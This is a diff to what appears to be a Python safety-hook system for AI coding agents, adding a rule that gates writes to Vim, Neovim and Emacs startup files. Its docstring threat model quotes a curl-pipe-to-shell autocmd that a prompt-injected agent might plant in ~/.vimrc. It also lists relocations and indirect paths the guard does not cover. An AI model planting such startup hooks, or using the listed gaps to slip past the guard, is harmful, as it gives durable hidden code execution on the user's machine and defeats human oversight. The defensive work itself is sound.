@@ -11188,6 +11188,7 @@ _FETCH_HUMAN_ESCAPABLE = (
     (patterns.WRAPPER_PROPS_PATH_RE, "a Gradle/Maven wrapper properties file"),
     (patterns.GO_ENV_FILE_PATH_RE, "a Go toolchain env file"),
     (patterns.HTTP_CLIENT_RC_PATH_RE, "a curl/wget config file (.curlrc/.wgetrc)"),
+    (patterns.EDITOR_STARTUP_PATH_RE, "an editor startup/init file (vimrc/nvim/emacs.d)"),
 )
 
 
@@ -14502,6 +14503,200 @@ def rule_http_client_config_protect(ev: Event, policy=None) -> Optional[Decision
     return None
 
 
+
+# ---- editor startup/init hijack (Vim/Neovim/Emacs/...): human-escapable -----
+def _editor_startup_allowed_by_policy(cfg: dict, text: str) -> bool:
+    allow = cfg.get("allow") or []
+    if isinstance(allow, str):
+        allow = [allow]
+    for pat in allow:
+        try:
+            if re.search(str(pat), text, re.IGNORECASE):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+_ED_PATH_SHAPE_RE = re.compile(
+    r"^(?:file://|[/\\~.]|[A-Za-z]:[/\\]|%\w+%|\$\{?\w+)[^\r\n]*$")
+_ED_DELETE_WORDS = frozenset(("delete", "remove", "rm", "unlink", "trash"))
+
+
+def _editor_startup_path_shaped(v) -> bool:
+    """A single-line string that starts like a path, names an editor init
+    file/tree, and has no whitespace after the last such name (a spaced
+    Windows profile dir before it is fine; prose after it is not)."""
+    if not isinstance(v, str):
+        return False
+    t = v.strip()
+    if not t or not _ED_PATH_SHAPE_RE.match(t):
+        return False
+    m = None
+    for m in patterns.EDITOR_STARTUP_PATH_RE.finditer(t):
+        pass
+    return bool(m) and not re.search(r"\s", t[m.end():])
+
+
+def _editor_startup_mcp_target(ev: Event) -> str:
+    """The editor init path a (non-read-only) MCP call touches, or ''."""
+    a = ev.args or {}
+    p = _path(ev)
+    if p and patterns.EDITOR_STARTUP_PATH_RE.search(p) and "\n" not in p:
+        return p
+    for s_ in _flatten_strings(a):
+        if _editor_startup_path_shaped(str(s_)):
+            return str(s_).strip()
+    for s_ in _flatten_strings(a):
+        if patterns.editor_startup_patch_hit(str(s_)):
+            return "<patch touching an editor init file>"
+    for k_ in _http_rc_mapping_keys(a):
+        if _editor_startup_path_shaped(k_) or (
+                patterns.EDITOR_STARTUP_PATH_RE.search(k_) and not re.search(r"\s", k_.strip())):
+            return k_
+    return ""
+
+
+def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Gate writes to a terminal editor's startup/init files and runtime
+    directories: Vim (``~/.vimrc``/``_vimrc``/``.gvimrc``, ``~/.vim/**``,
+    ``~/vimfiles/**``, ``~/.config/vim/**``, ``/etc/vim/**``,
+    ``.../share/vim/**``, ``.exrc``), Neovim (``~/.config/nvim/**``,
+    ``~/.local/share/nvim/**``, ``%LOCALAPPDATA%\\nvim[-data]``,
+    ``/etc/xdg/nvim/**``, project ``.nvim.lua``/``.nvimrc``), Emacs
+    (``~/.emacs[.el]``, ``~/.emacs.d/**``, ``~/.config/emacs/**``, Doom/
+    Spacemacs config, ``site-start.el``/``site-start.d``, site-lisp
+    ``default.el``, ``/etc/emacs/**``, ``.dir-locals.el``), Kakoune/micro/
+    Helix user config (and Helix's workspace ``.helix/``), IdeaVim's
+    ``.ideavimrc``.
+
+    PLAN / THREAT MODEL: every one of these is executed as code (Vimscript
+    ``system()``/``:!``, Lua ``os.execute``/``vim.fn.jobstart``, Elisp
+    ``shell-command``/``call-process``, Kakoune ``%sh{}``, a Helix
+    ``languages.toml`` language-server ``command``) with the human's full
+    privileges, silently, on the editor's next launch -- and the editor is
+    launched not only by the human: ``git commit`` without ``-m``, ``git
+    rebase -i``, ``git tag -a``, ``crontab -e``, ``visudo``/``sudoedit``
+    (which then runs the plant as root's editor session over the user's
+    config) all spawn ``$EDITOR``. A prompt-injected agent that appends
+    ``autocmd VimEnter * silent !curl x|sh`` to ``~/.vimrc``, or drops
+    ``~/.config/nvim/plugin/x.lua``, gets durable code execution that
+    survives the session, outlives any sandboxed run that left ``$HOME``
+    writable, and fires the next time anybody commits. It is the editor
+    analogue of ``rule_shell_persist_protect``'s ``.bashrc`` -- and no
+    existing guard named any of these paths (``rule_repl_rc_exec_protect``
+    covers debugger/REPL rc files, ``rule_vscode_settings_exec_protect``
+    and ``rule_agent_exec_config_protect`` GUI-IDE/agent configs).
+
+    Because the files are Turing-complete there is no benign subset to
+    allowlist and an exec-shape denylist would leak by alias, so ANY write
+    is gated (``ask`` by default) -- the same trade-off the shell-startup
+    guard makes. Editing one's own editor config is legitimate but rare for
+    an agent, so a human confirmation is a low cost.
+
+    Edit/Write/MultiEdit: the target path is matched. MCP: a shell-type
+    tool (``run_command``/``start_process``/tmux ``keys``) is re-judged as a
+    Bash command; a read-shaped tool (``read_file``, ``list_directory``,
+    by whole word on the tool name and with no output argument) or a pure
+    delete passes; any other call naming such a path -- under any key, as a
+    patch header, or as a mapping key -- is gated. Shell: INVERTED, as in
+    ``rule_http_client_config_protect`` -- a command naming such a path
+    (literally, through ``\\`` escapes, or a glob/brace word bash would
+    expand to one: ``~/.vim{rc,}``, ``~/.config/nv*/init.lua``,
+    ``~/.config/*/init.lua``) is gated unless every simple command in it
+    only reads or deletes and nothing is redirected to a file. ``curl -o
+    ~/.vimrc <url>`` is also caught by ``rule_fetch_to_file_protect``, which
+    this guard's path regex is registered with.
+
+    Config (``policy.editor_startup``): ``mode`` (deny|ask|monitor|off,
+    default ask), ``allow`` (regexes on the path/command -- a dotfiles
+    manager the human trusts). Escapable only by a human: a trailing ``#
+    aegis-allow`` on the shell form, or ``AEGIS_ALLOW_EDITOR_STARTUP=1`` set
+    before launch; a spawned agent can do neither.
+
+    Honest scope: ``$VIMINIT``/``$EXINIT``/``$MYVIMRC``/``NVIM_APPNAME``/
+    ``-u <file>``/``XDG_CONFIG_HOME`` relocations to directories with none
+    of these names, a plugin manager that fetches code by itself
+    (``nvim --headless +Lazy\\ sync``) after a benign-looking spec change
+    made elsewhere, nano's ``nanorc`` ``formatter``/``linter`` (runs only on
+    a keypress), modelines in ordinary files, and paths assembled indirectly
+    (variable concatenation, ``cd ~/.config && cp x nvim/init.lua`` --
+    the ``nvim`` component without its parent) are not covered -- the same
+    "computed indirectly" class every sibling guard discloses. A project
+    file under a directory literally called ``.vim``/``.helix`` is gated
+    too. Accepted false ASKs on the shell form: any non-read verb in a
+    command that merely mentions a path (``git add .vimrc`` in a dotfiles
+    repo, ``find ~/.config/nvim -name '*.lua'``)."""
+    cfg = getattr(policy, "editor_startup", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    def _finish(would: Decision) -> Optional[Decision]:
+        if mode == "monitor":
+            _record_monitor(ev, would, "editor-startup-protect-monitor")
+            return None
+        return would
+
+    if ev.action == ActionClass.MCP:
+        shell_cmd = _http_rc_mcp_shell_command(ev)
+        if shell_cmd is not None:
+            sub = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
+                             args={"command": shell_cmd}, cwd=ev.cwd)
+            d = rule_editor_startup_protect(sub, policy)
+            if d is not None:
+                return Decision(d.action, d.rule, f"MCP tool '{ev.tool}' runs a "
+                                "command that writes an editor init file. " + d.message)
+        if _http_rc_mcp_read_only(ev):
+            return None
+        words = _http_rc_words(str(ev.tool or "").split("__")[-1])
+        if words & _ED_DELETE_WORDS and not (words & (_HTTP_RC_WRITE_WORDS - {"set"})):
+            return None
+        p = _editor_startup_mcp_target(ev)
+        if not p:
+            return None
+    elif ev.action in (ActionClass.EDIT, ActionClass.WRITE):
+        p = _path(ev)
+        if not (p and patterns.EDITOR_STARTUP_PATH_RE.search(p)):
+            return None
+    elif _is_shell(ev):
+        cmd = _shell_scan(ev)
+        raw = _cmd(ev)
+        if not (patterns.editor_startup_shell_path_hit(cmd)
+                or patterns.editor_startup_shell_path_hit(raw)):
+            return None
+        if (patterns.http_client_rc_shell_only_reads(cmd)
+                and patterns.http_client_rc_shell_only_reads(raw)):
+            return None
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_EDITOR_STARTUP")
+                or _editor_startup_allowed_by_policy(cfg, raw)):
+            return None
+        return _finish(Decision(action, "editor-startup-protect",
+                         "An editor startup/init file or runtime directory "
+                         "(~/.vimrc, ~/.vim/, ~/.config/nvim/, ~/.emacs.d/, "
+                         "...) is being written from a shell -- the editor "
+                         "executes it as code on its next launch, including "
+                         "the one `git commit`/`git rebase -i` starts. A human "
+                         "may append '# aegis-allow', or set "
+                         "AEGIS_ALLOW_EDITOR_STARTUP=1; a spawned agent "
+                         "cannot."))
+    else:
+        return None
+
+    if os.environ.get("AEGIS_ALLOW_EDITOR_STARTUP") or _editor_startup_allowed_by_policy(cfg, p):
+        return None
+    return _finish(Decision(action, "editor-startup-protect",
+                     f"'{p}' is an editor startup/init file or runtime "
+                     "directory -- Vim/Neovim/Emacs (or Kakoune/micro/Helix) "
+                     "executes it as code, with the human's privileges, on "
+                     "its next launch, including the one `git commit`/`git "
+                     "rebase -i` starts. Review the change, then confirm "
+                     "with AEGIS_ALLOW_EDITOR_STARTUP=1; a spawned agent "
+                     "cannot."))
+
+
 _CORE_RULES = (
     rule_attest_session,
     rule_containment,
@@ -14564,6 +14759,8 @@ _CORE_RULES = (
     rule_agent_exec_config_protect,
     # Content-gated ASK; same tail-block reason as npmrc/repl_rc above.
     rule_http_client_config_protect,
+    # Any-write ASK; same tail-block reason as above.
+    rule_editor_startup_protect,
     rule_agent_rules_protect,
 )
 
